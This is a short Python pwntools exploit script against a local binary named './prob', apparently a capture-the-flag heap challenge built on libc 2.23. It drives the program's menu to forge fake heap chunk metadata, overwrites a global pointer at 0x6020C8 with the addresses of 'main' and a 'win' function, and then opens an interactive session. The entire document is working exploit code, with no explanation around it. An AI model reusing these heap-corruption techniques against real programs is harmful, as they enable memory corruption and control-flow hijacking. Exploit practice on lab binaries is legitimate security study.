from pwn import *

e = ELF('./prob')
io = process('./prob')
l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def inputName(name):
    io.recvuntil(' >> ')
    io.send(name)

def nameBullet(idx, name):
    io.recvuntil(' >> ')
    io.sendline('1')
    io.recvuntil(' >> ')
    io.sendline(str(idx))
    io.recvuntil(' >> ')
    io.send(name)

def dropBullet(idx):
    io.recvuntil(' >> ')
    io.sendline('2')
    io.recvuntil(' >> ')
    io.sendline(str(idx))

def nameGun(name):
    io.recvuntil(' >> ')
    io.sendline('3')
    io.recvuntil(' >> ')
    io.send(name)

def challenge():
    io.recvuntil(' >> ')
    io.sendline('4')

def giveUp(ans):
    io.recvuntil(' >> ')
    io.sendline('5')
    io.recvuntil(' >> ')
    io.send(ans)

inputName('\x00'*0x10+p64(0x30)[:-1])
dropBullet(0)
nameGun('\x00'*0x20+p64(0)+p64(0x30)+p64(0x6020C8))
giveUp((p64(e.sym['main'])*4)[:-1])
giveUp((p64(e.sym['win'])*4)[:-1])
challenge()
io.interactive()
